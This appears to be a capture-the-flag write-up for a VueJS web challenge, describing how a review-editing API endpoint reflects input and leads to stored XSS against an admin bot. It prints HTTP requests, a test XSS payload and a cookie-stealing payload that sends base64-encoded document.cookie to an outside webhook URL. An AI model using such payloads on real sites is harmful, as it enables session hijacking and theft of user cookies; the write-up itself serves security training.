## About the Challenge
We were given a website to test and this website using VueJS. Here is the preview of the website

If we press the `EXPLOIT` button in the corner of the website, it will return an alert

OK]


But there is an API endpoint that you can access [here](http://goodvue-api.rumble.host). If you access the homepage, the website will request to the API endpoint. Here is the HTTP request when the website send a request to `http://goodvue-api.rumble.host/get`

```
POST /get HTTP/1.1
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,id;q=0.8
...

{"id":"1","token":"OUR_COOKIE_VALUE"}
```

And it will return the review information such as likes, dislikes, and also the comments.

## How to Solve?
Because in the description there is an admin bot, so we know this is a XSS chall, and then because this website using VueJS i tried to check every request and I found this [url](http://goodvue.rumble.host/src/components/ImageComponent.vue)

}) .catch( (e_

put]


As you can see there are 2 endpoints:
* http://goodvue-api.rumble.host/get
* http://goodvue-api.rumble.host/edit

When i tried to edit one of the review by sending this request

```
POST /edit HTTP/1.1
Host: goodvue-api.rumble.host
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
...

{"id":"1","token":"OUR_COOKIE_VALUE","text":"test"}
```

Luckily our input was reflected in the website

And then i tried to use normal XSS payload

```html
<img src=x onerror=alert(document.cookie)>
```

And we got an alert, so I tried to create another payload to steal the admin cookie. Here is the payload I used to steal the cookie

```
<img src=x onerror=\"var i=new Image(); i.src='https://webhook.site/47c2cdc9-1233-4ac8-8e8b-55efe06aeb2c/?cookie='+btoa(document.cookie)\">"
```

After that, send the cookie to the admin and then wait until we got the admin's cookie
